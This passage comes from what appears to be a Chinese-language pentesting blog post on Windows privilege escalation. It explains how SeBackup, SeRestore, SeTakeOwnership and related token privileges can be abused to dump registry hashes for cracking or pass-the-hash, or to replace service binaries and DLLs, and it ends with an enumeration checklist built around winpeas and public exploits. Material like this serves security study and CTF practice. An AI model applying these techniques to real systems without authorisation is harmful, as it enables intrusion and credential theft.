<p>获取系统上所有对象的read权限，无视ACL<br>有了它，我们可以尝试访问敏感文件或从注册表中提权哈希，用于哈希破解或哈希传递</p>
<p><strong>SeRestorePrivilege</strong></p>
<p>获取系统上所有对象的write权限，无视ACL<br>这给我们更多的操作空间，比如<br>修改服务的二进制文件<br>覆盖系统程序的DLL文件<br>修改注册表设置</p>
<p><strong>SeTakeOwnershipPrivilege</strong></p>
<p>让用户获取一个对象的所有权(即<code>WRITE_OWNER</code>权限)<br>一旦获取了某个对象，你就可以修改它的ACL来授予自己写权限等，这样你就可以和SeRestorePrivilege一样的手段来尝试提权</p>
<p><strong>SeLoadDriverPrivilege</strong></p>
<p>参考HTB:Fuse</p>
<p>其他一些可以更高级进行提权的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•SeTcbPrivilege</span><br><span class="line">•SeCreateTokenPrivilege</span><br><span class="line">•SeDebugPrivilege(used by getsystem)147</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>永恒不变的道理<code>enumeration is the key</code></p>
<p>首先检查的第一件事应该是账户是谁，它属于哪一个组<br>winpeas枚举，检查每一项被重点标注的选项。但winpeas不是完美的，有时需要尝试其他枚举工具<br>重点是了解手动枚举的方法，在脚本无法正常运行的时候可以突破困境<br>(手动枚举:<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>)<br>重点检查用户的桌面或其他重点位置(C:\或C:\Program Files)，这些地方可能会存放一些有用的信息<br>仍然没有获得提权，再开始寻找一些第三方程序或者任何看起来奇怪的文件名，甚至是用户名，尝试确认它们的版本并寻找公开漏洞。<br>最后考虑内核提权</p>
]]></content>
      <categories>
        <category>后渗透Windows</category>
      </categories>
  </entry>
</search>
